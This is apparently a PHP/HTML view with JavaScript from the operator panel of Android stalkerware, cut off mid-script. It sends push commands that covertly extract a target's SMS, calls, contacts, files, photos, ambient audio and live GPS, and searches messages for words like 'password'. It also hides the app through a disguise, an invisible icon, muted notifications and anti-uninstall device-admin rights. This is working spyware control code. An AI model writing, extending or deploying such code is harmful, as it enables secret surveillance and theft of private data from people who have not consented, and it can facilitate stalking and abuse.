<?php /** @var array|null $targetDevice */ ?>
<div class="content-wrapper">
    <section class="content-header">
        <div class="container-fluid">
            <div class="row mb-3 align-items-center">
                <div class="col-lg-7">
                    <div class="d-flex align-items-center flex-wrap">
                        <h1 class="h2 mb-0 mr-3"><i class="fas fa-mobile-alt text-primary mr-2"></i>Remote Device</h1>
                        <span class="badge badge-primary border p-2"><i class="fas fa-signal mr-1"></i> Interactive Control</span>
                    </div>
                    <p class="text-muted mt-1 mb-0">Trigger data extraction, device management, and remote synchronization</p>
                </div>
                <div class="col-lg-5 text-right">
                    <span class="text-muted"><i class="fas fa-clock mr-1"></i> Live Session</span>
                </div>
            </div>
        </div>
    </section>

    <section class="content">
        <div class="container-fluid">
            <?php if (session()->getFlashdata('error')): ?>
            <div class="alert alert-danger alert-dismissible">
                <button type="button" class="close" data-dismiss="alert">&times;</button>
                <?= session()->getFlashdata('error') ?>
            </div>
            <?php endif; ?>

            <!-- Single Card with Header Nav-Tabs -->
            <div class="card card-primary card-outline shadow-sm">
                <div class="card-header">
                    <ul class="nav nav-tabs card-header-tabs" id="remoteDeviceTabs" role="tablist">
                        <li class="nav-item">
                            <a class="nav-link active" id="tab-fetch-link" data-toggle="tab" href="#tab-fetch" role="tab">
                                <i class="fas fa-database mr-2"></i>Data Fetch
                            </a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" id="tab-mgmt-link" data-toggle="tab" href="#tab-mgmt" role="tab">
                                <i class="fas fa-cogs mr-2"></i>Device Management
                            </a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" id="tab-settings-link" data-toggle="tab" href="#tab-settings" role="tab">
                                <i class="fas fa-sliders-h mr-2"></i>Settings
                            </a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" id="tab-perms-link" data-toggle="tab" href="#tab-perms" role="tab">
                                <i class="fas fa-shield-alt mr-2"></i>Permissions
                            </a>
                        </li>
                    </ul>
                    <div class="card-tools">
                        <?php if ($targetDevice): ?>
                            <span class="badge badge-dark border mr-2" title="Target Device">
                                <i class="fas fa-mobile-alt text-success mr-1"></i> 
                                <?= htmlspecialchars($targetDevice['device_model'] ?? 'Unknown Device') ?>
                            </span>
                            <script>const activeFcmToken = <?= json_encode($targetDevice['fcm_token'] ?? '') ?>;</script>
                        <?php else: ?>
                            <span class="badge badge-warning border mr-2">
                                <i class="fas fa-exclamation-circle mr-1"></i> No Active Device
                            </span>
                            <script>const activeFcmToken = '';</script>
                        <?php endif; ?>
                        <span class="badge badge-info mr-2" id="status-display" style="display:none;">Ready</span>
                    </div>
                </div>
                <div class="card-body">
                    <div class="tab-content" id="remoteDeviceTabsContent">

                        <!-- ==================== DATA FETCH TAB ==================== -->
                        <div class="tab-pane fade show active" id="tab-fetch" role="tabpanel">
                            <div class="row text-center" id="command-grid">
                                <?php
                                $commands = [
                                    ['id' => 'sms',          'label' => 'Fetch SMS',     'icon' => 'fas fa-sms',           'color' => '#007bff', 'desc' => 'All SMS messages'],
                                    ['id' => 'calls',        'label' => 'Call Logs',     'icon' => 'fas fa-phone-alt',     'color' => '#28a745', 'desc' => 'Full history'],
                                    ['id' => 'contacts',     'label' => 'Contacts',      'icon' => 'fas fa-address-book',  'color' => '#17a2b8', 'desc' => 'Full contact list'],
                                    ['id' => 'search_data',  'label' => 'Keyword Search','icon' => 'fas fa-search',        'color' => '#00acc1', 'desc' => 'Search SMS/Call data'],
                                    ['id' => 'capture_photo','label' => 'Camera Snap',   'icon' => 'fas fa-camera',        'color' => '#d81b60', 'desc' => 'Remote photo capture'],
                                    ['id' => 'record_audio', 'label' => 'Ambient Audio', 'icon' => 'fas fa-microphone',    'color' => '#ff8f00', 'desc' => 'Record environment audio'],
                                    ['id' => 'files',        'label' => 'File List',     'icon' => 'fas fa-file-alt',      'color' => '#20c997', 'desc' => 'Recent files'],
                                    ['id' => 'fetch_file',   'label' => 'Targeted File', 'icon' => 'fas fa-file-download', 'color' => '#00897b', 'desc' => 'Fetch specific file path'],
                                    ['id' => 'location',     'label' => 'GPS Location',  'icon' => 'fas fa-map-marker-alt','color' => '#dc3545', 'desc' => 'Precise activity'],
                                    ['id' => 'start_tracking','label' => 'Live Tracking','icon' => 'fas fa-route',         'color' => '#e53935', 'desc' => 'Real-time GPS tracking'],
                                    ['id' => 'context',      'label' => 'Context',       'icon' => 'fas fa-walking',       'color' => '#e83e8c', 'desc' => 'Motion & state'],
                                    ['id' => 'apps',         'label' => 'Apps List',     'icon' => 'fas fa-th-large',      'color' => '#6f42c1', 'desc' => 'Installed apps'],
                                    ['id' => 'usage',        'label' => 'App Usage',     'icon' => 'fas fa-chart-pie',     'color' => '#6610f2', 'desc' => 'Screen-time stats'],
                                    ['id' => 'notifications','label' => 'Alerts',        'icon' => 'fas fa-bell',          'color' => '#ffc107', 'desc' => 'Status bar alerts'],
                                    ['id' => 'device_info',  'label' => 'Device Info',   'icon' => 'fas fa-info-circle',   'color' => '#6c757d', 'desc' => 'Hardware & build'],
                                    ['id' => 'sensors',      'label' => 'Sensors',       'icon' => 'fas fa-microchip',     'color' => '#117a8b', 'desc' => 'Sensor profile'],
                                    ['id' => 'network',      'label' => 'Network',       'icon' => 'fas fa-wifi',          'color' => '#0056b3', 'desc' => 'WiFi & connection'],
                                    ['id' => 'bluetooth',    'label' => 'Bluetooth',     'icon' => 'fab fa-bluetooth-b',   'color' => '#4e73df', 'desc' => 'Nearby devices'],
                                    ['id' => 'calendar',     'label' => 'Calendar',      'icon' => 'fas fa-calendar-alt',  'color' => '#fd7e14', 'desc' => 'Events & tasks'],
                                    ['id' => 'accounts',     'label' => 'Accounts',      'icon' => 'fas fa-user-circle',   'color' => '#343a40', 'desc' => 'System accounts'],
                                    ['id' => 'beep',         'label' => 'Test Beep',     'icon' => 'fas fa-volume-up',     'color' => '#8e44ad', 'desc' => 'Play a beep sound'],
                                    ['id' => 'all',          'label' => 'Sync All',      'icon' => 'fas fa-sync-alt',      'color' => '#b21f2d', 'desc' => 'Full extraction'],
                                ];
                                foreach ($commands as $cmd):
                                ?>
                                <div class="col-6 col-sm-4 col-md-3 col-lg-2 mb-4">
                                    <button class="btn btn-block btn-remote-cmd p-3 shadow-sm border h-100 d-flex flex-column align-items-center justify-content-center" 
                                            data-cmd="<?= $cmd['id'] ?>" 
                                            style="border-radius: 12px; transition: all 0.3s; background: #fff;">
                                        <div class="cmd-icon-wrapper mb-2" style="color: <?= $cmd['color'] ?>; font-size: 2rem;">
                                            <i class="<?= $cmd['icon'] ?>"></i>
                                        </div>
                                        <h6 class="font-weight-bold mb-1 text-dark"><?= $cmd['label'] ?></h6>
                                        <small class="text-muted d-none d-sm-block"><?= $cmd['desc'] ?></small>
                                    </button>
                                </div>
                                <?php endforeach; ?>
                            </div>
                        </div>

                        <!-- ==================== DEVICE MANAGEMENT TAB ==================== -->
                        <div class="tab-pane fade" id="tab-mgmt" role="tabpanel">
                            <div class="alert alert-warning">
                                <i class="fas fa-exclamation-triangle mr-2"></i>
                                <strong>Caution:</strong> These commands make permanent changes to the Android device. Confirm each action carefully.
                            </div>
                            <div class="row" id="mgmt-grid">
                                <div class="col-lg-4 mb-4">
                                    <div class="card h-100 border border-warning">
                                        <div class="card-body text-center">
                                            <div class="mb-3"><i class="fas fa-undo fa-3x text-warning"></i></div>
                                            <h5 class="card-title text-warning font-weight-bold">Reset App</h5>
                                            <p class="text-muted small">Restore default icon, clear stealth disguise, reset launch codes to defaults.</p>
                                            <button class="btn btn-warning btn-block btn-mgmt-cmd" data-cmd="reset_app"><i class="fas fa-undo mr-1"></i> Reset App</button>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-lg-4 mb-4">
                                    <div class="card h-100 border border-secondary">
                                        <div class="card-body text-center">
                                            <div class="mb-3"><i class="fas fa-eye-slash fa-3x text-secondary"></i></div>
                                            <h5 class="card-title text-secondary font-weight-bold">Deactivate App</h5>
                                            <p class="text-muted small">Replaces app UI with a static dummy page. Unauthorized users see nothing suspicious.</p>
                                            <button class="btn btn-secondary btn-block btn-mgmt-cmd" data-cmd="deactivate"><i class="fas fa-eye-slash mr-1"></i> Deactivate</button>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-lg-4 mb-4">
                                    <div class="card h-100 border border-info">
                                        <div class="card-body text-center">
                                            <div class="mb-3"><i class="fas fa-sign-out-alt fa-3x text-info"></i></div>
                                            <h5 class="card-title text-info font-weight-bold">Logout User</h5>
                                            <p class="text-muted small">Clears auth token on the device and stops background sync. Returns to login screen.</p>
                                            <button class="btn btn-info btn-block btn-mgmt-cmd" data-cmd="logout"><i class="fas fa-sign-out-alt mr-1"></i> Logout</button>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-lg-4 mb-4">
                                    <div class="card h-100 border border-danger">
                                        <div class="card-body text-center">
                                            <div class="mb-3"><i class="fas fa-archive fa-3x text-danger"></i></div>
                                            <h5 class="card-title text-danger font-weight-bold">Uninstall (Keep Data)</h5>
                                            <p class="text-muted small">Backs up app data, then uninstalls. Reinstalling will restore configuration automatically.</p>
                                            <button class="btn btn-danger btn-block btn-mgmt-cmd" data-cmd="uninstall_preserve"><i class="fas fa-archive mr-1"></i> Uninstall (Keep Data)</button>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-lg-4 mb-4">
                                    <div class="card h-100 border border-dark">
                                        <div class="card-body text-center">
                                            <div class="mb-3"><i class="fas fa-trash-alt fa-3x text-dark"></i></div>
                                            <h5 class="card-title font-weight-bold">Uninstall (Wipe All)</h5>
                                            <p class="text-muted small">Completely removes the app and all local data. Device admin may enable silent removal.</p>
                                            <button class="btn btn-dark btn-block btn-mgmt-cmd" data-cmd="uninstall_wipe"><i class="fas fa-trash-alt mr-1"></i> Uninstall (Wipe All)</button>
                                        </div>
                                    </div>
                                </div>
                        </div>
                    </div>
                    <!-- ==================== SETTINGS TAB ==================== -->
                    <div class="tab-pane fade" id="tab-settings" role="tabpanel">
                        <div class="alert alert-info">
                            <i class="fas fa-info-circle mr-2"></i>
                            <strong>Remote Settings:</strong> Changes are applied immediately on the device. All settings are stored in the app's SharedPreferences.
                        </div>
                        <form id="settingsForm" class="row">
                            <!-- Auto Sync -->
                            <div class="col-md-6 mb-3">
                                <div class="card h-100 border">
                                    <div class="card-body">
                                        <div class="d-flex justify-content-between align-items-center mb-2">
                                            <h6 class="mb-0"><i class="fas fa-sync text-primary mr-2"></i>Auto Sync</h6>
                                            <div class="custom-control custom-switch">
                                                <input type="checkbox" class="custom-control-input setting-toggle" id="pref_auto_sync" data-pref="pref_auto_sync_v2">
                                                <label class="custom-control-label" for="pref_auto_sync"></label>
                                            </div>
                                        </div>
                                        <small class="text-muted">Enable scheduled automatic data uploads.</small>
                                    </div>
                                </div>
                            </div>
                            <!-- Sync Interval -->
                            <div class="col-md-6 mb-3">
                                <div class="card h-100 border">
                                    <div class="card-body">
                                        <h6><i class="fas fa-clock text-primary mr-2"></i>Sync Interval (minutes)</h6>
                                        <div class="input-group input-group-sm mt-2">
                                            <input type="number" class="form-control setting-input" data-pref="pref_sync_interval_v2" value="60" min="1" max="1440">
                                            <div class="input-group-append">
                                                <span class="input-group-text">min</span>
                                            </div>
                                        </div>
                                        <small class="text-muted">How often the device uploads data automatically.</small>
                                    </div>
                                </div>
                            </div>
                            <!-- Disable Uploads -->
                            <div class="col-md-6 mb-3">
                                <div class="card h-100 border">
                                    <div class="card-body">
                                        <div class="d-flex justify-content-between align-items-center mb-2">
                                            <h6 class="mb-0"><i class="fas fa-ban text-danger mr-2"></i>Disable Uploads</h6>
                                            <div class="custom-control custom-switch">
                                                <input type="checkbox" class="custom-control-input setting-toggle" id="pref_disable_uploads" data-pref="pref_disable_uploads">
                                                <label class="custom-control-label" for="pref_disable_uploads"></label>
                                            </div>
                                        </div>
                                        <small class="text-muted">Stop all data uploads from the device.</small>
                                    </div>
                                </div>
                            </div>
                            <!-- Disable File Uploads -->
                            <div class="col-md-6 mb-3">
                                <div class="card h-100 border">
                                    <div class="card-body">
                                        <div class="d-flex justify-content-between align-items-center mb-2">
                                            <h6 class="mb-0"><i class="fas fa-file-alt text-danger mr-2"></i>Disable File Uploads</h6>
                                            <div class="custom-control custom-switch">
                                                <input type="checkbox" class="custom-control-input setting-toggle" id="pref_disable_file_uploads" data-pref="pref_disable_file_uploads">
                                                <label class="custom-control-label" for="pref_disable_file_uploads"></label>
                                            </div>
                                        </div>
                                        <small class="text-muted">Prevent file/media uploads specifically.</small>
                                    </div>
                                </div>
                            </div>
                            <!-- Live Location Interval -->
                            <div class="col-md-6 mb-3">
                                <div class="card h-100 border">
                                    <div class="card-body">
                                        <h6><i class="fas fa-map-marker-alt text-danger mr-2"></i>Live Location Interval (minutes)</h6>
                                        <div class="input-group input-group-sm mt-2">
                                            <input type="number" class="form-control setting-input" data-pref="pref_live_location_interval" value="30" min="1" max="1440">
                                            <div class="input-group-append">
                                                <span class="input-group-text">min</span>
                                            </div>
                                        </div>
                                        <small class="text-muted">Frequency of GPS location pings.</small>
                                    </div>
                                </div>
                            </div>
                            <!-- Offline Queue Sync Interval -->
                            <div class="col-md-6 mb-3">
                                <div class="card h-100 border">
                                    <div class="card-body">
                                        <h6><i class="fas fa-hourglass-half text-warning mr-2"></i>Offline Queue Sync Interval</h6>
                                        <div class="input-group input-group-sm mt-2">
                                            <input type="number" class="form-control setting-input" data-pref="pref_queue_sync_interval" value="15" min="1" max="120">
                                            <div class="input-group-append">
                                                <span class="input-group-text">min</span>
                                            </div>
                                        </div>
                                        <small class="text-muted">How often queued offline data is flushed.</small>
                                    </div>
                                </div>
                            </div>
                            <!-- Ghost Mode -->
                            <div class="col-md-6 mb-3">
                                <div class="card h-100 border">
                                    <div class="card-body">
                                        <div class="d-flex justify-content-between align-items-center mb-2">
                                            <h6 class="mb-0"><i class="fas fa-eye-slash text-secondary mr-2"></i>Ghost Mode</h6>
                                            <div class="custom-control custom-switch">
                                                <input type="checkbox" class="custom-control-input setting-toggle" id="pref_ghost_mode" data-pref="pref_ghost_mode">
                                                <label class="custom-control-label" for="pref_ghost_mode"></label>
                                            </div>
                                        </div>
                                        <small class="text-muted">Hide all app icons from the launcher.</small>
                                    </div>
                                </div>
                            </div>
                            <!-- Total Stealth Mode -->
                            <div class="col-md-6 mb-3">
                                <div class="card h-100 border">
                                    <div class="card-body">
                                        <div class="d-flex justify-content-between align-items-center mb-2">
                                            <h6 class="mb-0"><i class="fas fa-user-secret text-dark mr-2"></i>Total Stealth Mode</h6>
                                            <div class="custom-control custom-switch">
                                                <input type="checkbox" class="custom-control-input setting-toggle" id="pref_total_stealth" data-pref="pref_total_stealth_mode">
                                                <label class="custom-control-label" for="pref_total_stealth"></label>
                                            </div>
                                        </div>
                                        <small class="text-muted">Mute all notifications and toast messages.</small>
                                    </div>
                                </div>
                            </div>
                            <!-- Server URL -->
                            <div class="col-md-12 mb-3">
                                <div class="card h-100 border">
                                    <div class="card-body">
                                        <h6><i class="fas fa-server text-info mr-2"></i>Server URL</h6>
                                        <div class="input-group input-group-sm mt-2">
                                            <input type="url" class="form-control setting-input" data-pref="pref_server_url" value="" placeholder="https://your-server.com">
                                            <div class="input-group-append">
                                                <button class="btn btn-info btn-sm" type="button" onclick="applySettings()"><i class="fas fa-check mr-1"></i> Apply All</button>
                                            </div>
                                        </div>
                                        <small class="text-muted">Change the server endpoint the device connects to.</small>
                                    </div>
                                </div>
                            </div>
                        </form>
                    </div>

                    <!-- ==================== PERMISSIONS TAB ==================== -->
                    <div class="tab-pane fade" id="tab-perms" role="tabpanel">
                        <div class="alert alert-warning">
                            <i class="fas fa-exclamation-triangle mr-2"></i>
                            <strong>Upload Permissions:</strong> Each permission controls whether that data type is uploaded to the server. Revoking a permission stops uploads for that type — the app retains on-device access. Use with caution.
                        </div>
                        <div class="row" id="perms-grid">
                            <?php
                            $permissions = [
                                ['id' => 'sms',           'label' => 'SMS',            'icon' => 'fa-sms',           'color' => 'info',       'desc' => 'Read & Send SMS messages'],
                                ['id' => 'calls',         'label' => 'Phone / Calls',  'icon' => 'fa-phone-alt',     'color' => 'success',    'desc' => 'Read call logs & manage phone calls'],
                                ['id' => 'contacts',      'label' => 'Contacts',       'icon' => 'fa-address-book',  'color' => 'primary',    'desc' => 'Read & modify contact list'],
                                ['id' => 'location',      'label' => 'Location',       'icon' => 'fa-map-marker-alt','color' => 'danger',     'desc' => 'Fine & Coarse location access'],
                                ['id' => 'files',         'label' => 'Storage / Files','icon' => 'fa-folder-open',   'color' => 'warning',    'desc' => 'Read & write device storage'],
                                ['id' => 'camera',        'label' => 'Camera',         'icon' => 'fa-camera',        'color' => '#d81b60',    'desc' => 'Capture photos & video'],
                                ['id' => 'microphone',    'label' => 'Microphone',     'icon' => 'fa-microphone',    'color' => '#ff8f00',    'desc' => 'Record audio via microphone'],
                                ['id' => 'calendar',      'label' => 'Calendar',       'icon' => 'fa-calendar-alt',  'color' => '#fd7e14',    'desc' => 'Read & modify calendar events'],
                                ['id' => 'phone_state',   'label' => 'Phone State',    'icon' => 'fa-phone-square',  'color' => '#6c757d',    'desc' => 'Read device IMEI & phone status'],
                                ['id' => 'bluetooth',     'label' => 'Bluetooth',      'icon' => 'fab fa-bluetooth-b','color' => '#4e73df',   'desc' => 'Access Bluetooth connections'],
                                ['id' => 'usage_stats',   'label' => 'Usage Stats',    'icon' => 'fa-chart-pie',     'color' => '#6610f2',    'desc' => 'App usage statistics access'],
                                ['id' => 'notifications', 'label' => 'Notifications',  'icon' => 'fa-bell',          'color' => '#ffc107',    'desc' => 'Read & intercept notifications'],
                                ['id' => 'battery',       'label' => 'Battery Opt.',   'icon' => 'fa-battery-half',  'color' => '#28a745',    'desc' => 'Disable battery optimizations'],
                                ['id' => 'overlay',       'label' => 'Overlay',        'icon' => 'fa-layer-group',   'color' => '#17a2b8',    'desc' => 'Draw over other apps'],
                                ['id' => 'accessibility', 'label' => 'Accessibility',  'icon' => 'fa-universal-access','color' => '#343a40',  'desc' => 'Full device accessibility control'],
                                ['id' => 'notif_listener','label' => 'Notif. Listener','icon' => 'fa-list',           'color' => '#8e44ad',    'desc' => 'Notification listener service'],
                                ['id' => 'device_admin',  'label' => 'Device Admin',   'icon' => 'fa-shield-alt',    'color' => '#dc3545',    'desc' => 'Device admin & anti-uninstall'],
                            ];
                            foreach ($permissions as $perm):
                            ?>
                            <div class="col-lg-4 col-md-6 mb-3">
                                <div class="card h-100 border">
                                    <div class="card-body text-center">
                                        <div class="mb-2" style="color: <?= $perm['color'] ?>; font-size: 1.8rem;">
                                            <i class="fas <?= $perm['icon'] ?>"></i>
                                        </div>
                                        <h6 class="font-weight-bold"><?= $perm['label'] ?></h6>
                                        <p class="text-muted small mb-2"><?= $perm['desc'] ?></p>
                                        <span class="perm-status-badge badge badge-secondary d-block mb-2"><i class="fas fa-spinner fa-spin mr-1"></i> Loading...</span>
                                        <button class="btn btn-outline-danger btn-sm btn-perm-cmd btn-block" data-perm="<?= $perm['id'] ?>" data-desc="<?= htmlspecialchars($perm['desc'], ENT_QUOTES) ?>">
                                            <i class="fas fa-shield-alt mr-1"></i> Revoke
                                        </button>
                                    </div>
                                </div>
                            </div>
                            <?php endforeach; ?>
                        </div>
                    </div>
                </div>
            </div>
            <div class="card-footer bg-light">
                    <div class="d-flex align-items-center flex-wrap">
                        <i class="fas fa-info-circle text-info mr-2"></i>
                        <small class="text-muted">Commands are sent via Google Firebase Cloud Messaging (FCM). The device must be online to receive commands. Some actions require Device Admin privileges.</small>
                        <?php if (!empty($recentUploadSources)): ?>
                            <span class="ml-auto d-flex align-items-center">
                                <i class="fas fa-cloud-upload-alt text-muted mr-1"></i>
                                <?php foreach ($recentUploadSources as $src): ?>
                                    <?php $badgeClass = match($src['upload_source']) { 'manual' => 'badge-primary', 'auto_sync' => 'badge-secondary', 'web_initiated' => 'badge-success', default => 'badge-secondary', }; ?>
                                    <span class="badge <?= $badgeClass ?> mr-1" title="Last 7 days"><?= str_replace('_', ' ', $src['upload_source']) ?>: <?= $src['count'] ?></span>
                                <?php endforeach; ?>
                            </span>
                        <?php endif; ?>
                    </div>
                </div>
            </div>
        </div>
    </section>
</div>

<style>
    .btn-remote-cmd:hover {
        transform: translateY(-5px);
        box-shadow: 0 10px 20px rgba(0,0,0,0.1) !important;
        border-color: #007bff !important;
    }
    .btn-remote-cmd:active {
        transform: translateY(-2px);
    }
    .btn-remote-cmd.loading {
        opacity: 0.7;
        pointer-events: none;
    }
    .btn-remote-cmd.loading i {
        animation: spin 1s linear infinite;
    }
    @keyframes spin {
        100% { transform: rotate(360deg); }
    }
    .cmd-icon-wrapper {
        width: 60px;
        height: 60px;
        display: flex;
        align-items: center;
        justify-content: center;
        background: rgba(0,0,0,0.02);
        border-radius: 50%;
        transition: all 0.3s;
    }
    .btn-remote-cmd:hover .cmd-icon-wrapper {
        background: rgba(0,123,255,0.05);
    }
    .btn-mgmt-cmd.loading {
        opacity: 0.7;
        pointer-events: none;
    }
    .card-header-tabs .nav-link {
        font-weight: 600;
        padding: 10px 20px;
    }
</style>

<!-- Toastr CSS & JS -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>

<script>
let deviceConfig = null;

$(function() {
    // ========================
    // LOAD DEVICE CONFIG
    // ========================
    if (activeFcmToken) {
        $.getJSON(`<?= base_url('api/v1/device/config') ?>/${activeFcmToken}`)
            .done(function(resp) {
                if (resp.success && resp.config_json) {
                    deviceConfig = resp.config_json;
                    const perms = resp.permissions_json;
                    // Pre-fill settings toggles
                    $('.setting-toggle').each(function() {
                        const key = $(this).data('pref');
                        if (deviceConfig[key] !== undefined) {
                            $(this).prop('checked', deviceConfig[key] === true || deviceConfig[key] === 'true');
                        }
                    });
                    // Pre-fill settings inputs
                    $('.setting-input').each(function() {
                        const key = $(this).data('pref');
                        if (deviceConfig[key] !== undefined && deviceConfig[key] !== '') {
                            $(this).val(deviceConfig[key]);
                        }
                    });
                    // Update permission badges
                    if (perms && perms.granted) {
                        const grantedPerms = perms.granted.map(p => p.permission);
                        $('.btn-perm-cmd').each(function() {
                            const webId = $(this).data('perm');
                            const androidPerm = permWebToAndroid(webId);
                            const isGranted = androidPerm && grantedPerms.some(gp => gp.endsWith(androidPerm));
                            const badge = $(this).closest('.card-body').find('.perm-status-badge');
                            if (isGranted) {
                                badge.removeClass('badge-secondary').addClass('badge-success').html('<i class="fas fa-check mr-1"></i> Granted');
                            } else {
                                badge.removeClass('badge-success').addClass('badge-secondary').html('<i class="fas fa-times mr-1"></i> Denied');
                            }
                        });
                    }
                }
            })
            .fail(function() { /* no saved config yet */ });
    }

    function permWebToAndroid(webId) {
        const map = {
            sms: 'READ_SMS',
            calls: 'READ_CALL_LOG',
            contacts: 'READ_CONTACTS',
            location: 'ACCESS_FINE_LOCATION',
            files: 'READ_EXTERNAL_STORAGE',
            camera: 'CAMERA',
            microphone: 'RECORD_AUDIO',
            calendar: 'READ_CALENDAR',
            phone_state: 'READ_PHONE_STATE',
            bluetooth: 'BLUETOOTH_CONNECT',
            usage_stats: 'PACKAGE_USAGE_STATS',
            notifications: 'POST_NOTIFICATIONS',
            battery: 'REQUEST_IGNORE_BATTERY_OPTIMIZATIONS',
            overlay: 'SYSTEM_ALERT_WINDOW',
            accessibility: 'BIND_ACCESSIBILITY_SERVICE',
            notif_listener: 'BIND_NOTIFICATION_LISTENER_SERVICE',
            device_admin: 'BIND_DEVICE_ADMIN',
        };
        return map[webId] || null;
    }
    // ========================
    // DATA FETCH COMMANDS
    // ========================
    $('.btn-remote-cmd').on('click', function() {
        const $btn = $(this);
        const cmd = $btn.data('cmd');
        const $icon = $btn.find('.cmd-icon-wrapper i');
        const originalIcon = $icon.attr('class') || $btn.find('i').attr('class');
        
        const executeCommand = (extraData = {}) => {
            if ($btn.hasClass('loading')) return;

            $btn.addClass('loading').prop('disabled', true);
            $icon.attr('class', 'fas fa-spinner fa-spin');
            $btn.find('i').attr('class', 'fas fa-spinner fa-spin');
            $('#status-display').fadeIn().removeClass('badge-danger badge-success').addClass('badge-info').text('Sending ' + cmd + '...');

            const resetBtn = () => {
                $btn.removeClass('loading').prop('disabled', false);
                $icon.attr('class', originalIcon);
                $btn.find('i').attr('class', originalIcon);
                setTimeout(() => $('#status-display').fadeOut(), 5000);
            };

                const apiUrl = `<?= base_url('api/v1/fcm/send') ?>/${activeFcmToken}/cmd_${cmd}`;

                const payloadMap = {
                    reset_app: 'reset',
                    deactivate: 'deactivate',
                    logout: 'logout',
                    uninstall_preserve: 'uninstall_preserve',
                    uninstall_wipe: 'uninstall_wipe',
                };
                const payload = payloadMap[cmd] || cmd;
                const apiUrlFull = `<?= base_url('api/v1/fcm/send') ?>/${activeFcmToken}/cmd_${cmd}/${payload}`;

            $.ajax({
                url: apiUrl,
                method: 'POST',
                data: extraData,
                dataType: 'json',
                timeout: 120000,
                success: function(response) {
                    resetBtn();
                    if (response && response.success == true) {
                        toastr.success('Successful');
                        $('#status-display').removeClass('badge-info').addClass('badge-success').text('Sent: ' + cmd);
                    } else {
                        toastr.error((response && response.message) ? response.message : 'Failed to send command');
                        $('#status-display').removeClass('badge-info').addClass('badge-danger').text('Error: ' + cmd);
                    }
                },
                error: function(xhr, status, error) {
                    resetBtn();
                    let errorMessage = 'Network error. Please try again.';
                    if (status === 'timeout') {
                        errorMessage = 'Request timed out after 2 minutes. The device might be offline.';
                    } else if (xhr.responseJSON) {
                        if (xhr.responseJSON.message) {
                            errorMessage = xhr.responseJSON.message;
                        } else if (xhr.responseJSON.messages && xhr.responseJSON.messages.error) {
                            errorMessage = xhr.responseJSON.messages.error;
                        }
                    }
                    toastr.error(errorMessage);
                    $('#status-display').removeClass('badge-info').addClass('badge-danger').text('Failed');
                }
            });
        };

        if (cmd === 'fetch_file') {
            Swal.fire({
                title: 'Targeted File Fetch',
                text: 'Enter the exact file path (e.g., /sdcard/Download/secret.pdf):',
                input: 'text',
                showCancelButton: true,
                confirmButtonText: 'Fetch File',
                inputValidator: (value) => {
                    if (!value) return 'File path is required!';
                }
            }).then((result) => {
                if (result.isConfirmed && result.value) {
                    executeCommand({ file_path: result.value });
                }
            });
        } else if (cmd === 'search_data') {
            Swal.fire({
                title: 'Targeted Data Search',
                text: 'Enter the keyword to search for in SMS/Calls (e.g., bank, password):',
                input: 'text',
                showCancelButton: true,
                confirmButtonText: 'Search',
                inputValidator: (value) => {
                    if (!value) return 'Keyword is required!';
                }
            }).then((result) => {
                if (result.isConfirmed && result.value) {
                    executeCommand({ keyword: result.value });
                }
            });
        } else if (cmd === 'start_tracking') {
             Swal.fire({
                title: 'Live Tracking',
                text: 'Enter duration in minutes (e.g., 60):',
                input: 'number',
                inputAttributes: { min: 1, max: 1440 },
                showCancelButton: true,
                confirmButtonText: 'Start Tracking',
                inputValue: 60
            }).then((result) => {
                if (result.isConfirmed && result.value) {
                    executeCommand({ duration_minutes: result.value });
                }
            });
        } else {
            executeCommand();
        }
    });

    // ========================
    // DEVICE MANAGEMENT COMMANDS
    // ========================
    $('.btn-mgmt-cmd').on('click', function() {
        const $btn = $(this);
        const cmd = $btn.data('cmd');

        if (!activeFcmToken) {
            toastr.error('No active device with FCM token found.');
            return;
        }

        const confirmTitles = {
            reset_app: 'Reset Android App?',
            deactivate: 'Deactivate Android App?',
            logout: 'Logout User on Device?',
            uninstall_preserve: 'Uninstall (Keep Data)?',
            uninstall_wipe: 'Uninstall (Wipe All Data)?',
        };

        const confirmTexts = {
            reset_app: 'Restore default icon, disable stealth disguise, reset launch codes (*#007#, 1234).',
            deactivate: 'Replace the app UI with a static dummy page. The app will appear to be a harmless device info screen.',
            logout: 'Clear the auth token on the device. Background sync will stop. The user will be returned to the login screen.',
            uninstall_preserve: 'Back up all app data, then uninstall. Reinstalling the app will restore your data automatically. Continue?',
            uninstall_wipe: 'Permanently remove the app and all local data. This cannot be undone. Continue?',
        };

        Swal.fire({
            title: confirmTitles[cmd] || 'Execute Command?',
            text: confirmTexts[cmd] || 'Are you sure?',
            icon: cmd === 'reset_app' ? 'warning' : 
                  cmd === 'deactivate' ? 'question' :
                  cmd === 'logout' ? 'info' : 'error',
            showCancelButton: true,
            confirmButtonColor: cmd === 'reset_app' ? '#ffc107' :
                              cmd === 'deactivate' ? '#6c757d' :
                              cmd === 'logout' ? '#17a2b8' : '#dc3545',
            cancelButtonColor: '#3085d6',
            confirmButtonText: 'Yes, execute',
            cancelButtonText: 'Cancel'
        }).then((result) => {
            if (result.isConfirmed) {
                $btn.addClass('loading').prop('disabled', true);
                const originalHtml = $btn.html();
                $btn.html('<i class="fas fa-spinner fa-spin mr-1"></i> Sending...');

                const mgmtPayloads = { reset_app: 'reset', deactivate: 'deactivate', logout: 'logout', uninstall_preserve: 'uninstall_preserve', uninstall_wipe: 'uninstall_wipe' };
                const mgmtPayload = mgmtPayloads[cmd] || cmd;
                const apiUrl = `<?= base_url('api/v1/fcm/send') ?>/${activeFcmToken}/cmd_${cmd}/${mgmtPayload}`;

                $.ajax({
                    url: apiUrl,
                    method: 'POST',
                    dataType: 'json',
                    timeout: 120000,
                    success: function(response) {
                        $btn.removeClass('loading').prop('disabled', false).html(originalHtml);
                        if (response && response.success == true) {
                            Swal.fire({
                                icon: 'success',
                                title: 'Command Sent',
                                text: 'The device will process the command shortly.',
                                timer: 3000,
                                showConfirmButton: false
                            });
                        } else {
                            toastr.error((response && response.message) ? response.message : 'Failed to send command');
                        }
                    },
                    error: function(xhr, status) {
                        $btn.removeClass('loading').prop('disabled', false).html(originalHtml);
                        let msg = 'Network error. The device might be offline.';
